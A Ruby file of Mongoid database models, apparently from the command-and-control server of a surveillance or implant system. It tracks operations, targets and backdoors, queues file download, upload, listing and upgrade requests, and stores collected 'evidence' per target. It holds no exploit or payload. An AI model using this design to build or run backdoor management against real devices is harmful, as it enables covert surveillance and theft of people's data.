require 'mongoid'

class Item
  include Mongoid::Document
  include Mongoid::Timestamps

  # common
  field :name, type: String
  field :desc, type: String
  field :status, type: String
  field :_kind, type: String
  field :_path, type: Array

  # operation
  field :contact, type: String

  # backdoor
  field :build, type: String
  field :instance, type: String
  field :version, type: String
  field :type, type: String
  field :platform, type: String
  field :deleted, type: Boolean
  field :uninstalled, type: Boolean
  field :counter, type: Integer
  field :pathseed, type: String
  field :confkey, type: String
  field :logkey, type: String
  field :upgradable, type: Boolean

  has_and_belongs_to_many :groups, :dependent => :nullify, :autosave => true

  embeds_many :filesystem_requests, class_name: "FilesystemRequest"
  embeds_many :download_requests, class_name: "DownloadRequest"
  embeds_many :upgrade_requests, class_name: "UpgradeRequest"
  embeds_many :upload_requests, class_name: "UploadRequest"

  embeds_one :stat

  embeds_many :configs, class_name: "Configuration"

  store_in :items

  after_create :create_callback
  after_destroy :destroy_callback

  protected
  def create_callback
    case self._kind
      when 'operation'
      when 'target'
        # create the collection for the evidence of this target
        db = Mongoid.database
        db.create_collection("evidence." + self._id.to_s)
      when 'backdoor'
    end
  end

  def destroy_callback
    case self._kind
      when 'operation'
        # destroy all the targets of this operation
        Item.where({_kind: 'target', _path: [ self._id ]}).each do |targ|
          targ.destroy
        end
      when 'target'
        db = Mongoid.database
        db.drop_collection("evidence." + self._id.to_s)
        # destroy all the backdoors of this target
        Item.where({_kind: 'backdoor'}).also_in({_path: [ self._id ]}).each do |bck|
          bck.destroy
        end
      when 'backdoor'
        #TODO: destroy all the evidences
    end
  end
end

class FilesystemRequest
  include Mongoid::Document
  
  field :path, type: String
  field :depth, type: Integer
  
  validates_uniqueness_of :path

  embedded_in :item
end

class DownloadRequest
  include Mongoid::Document

  field :path, type: String

  validates_uniqueness_of :path

  embedded_in :item
end

class UpgradeRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array

  validates_uniqueness_of :filename

  embedded_in :item
end

class UploadRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array
  
  validates_uniqueness_of :filename
  
  embedded_in :item
end

class Stat
  include Mongoid::Document

  field :source, type: String
  field :user, type: String
  field :device, type: String
  field :last_sync, type: Integer
  field :size, type: Integer
  field :evidence, type: Hash

  embedded_in :item
end
